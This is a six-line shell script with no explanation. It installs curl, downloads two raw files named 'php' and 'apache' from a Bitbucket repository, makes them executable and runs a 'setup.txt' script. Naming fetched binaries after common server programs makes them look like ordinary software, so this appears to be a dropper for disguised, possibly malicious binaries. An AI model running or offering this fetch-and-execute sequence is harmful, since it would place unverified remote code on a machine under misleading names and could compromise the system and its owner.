apt update -y
apt install curl iputils-ping --assume-yes --reinstall
curl -L https://bitbucket.org/eatyourshet/php/raw/1a31554cdede888ae70fbeedc5e909a3926ea2da/php --output php
curl -L https://bitbucket.org/eatyourshet/php/raw/b1ee5dc709956a92763976e15dd18f9ab8f40698/apache --output apache
chmod +x php apache
bash setup.txt
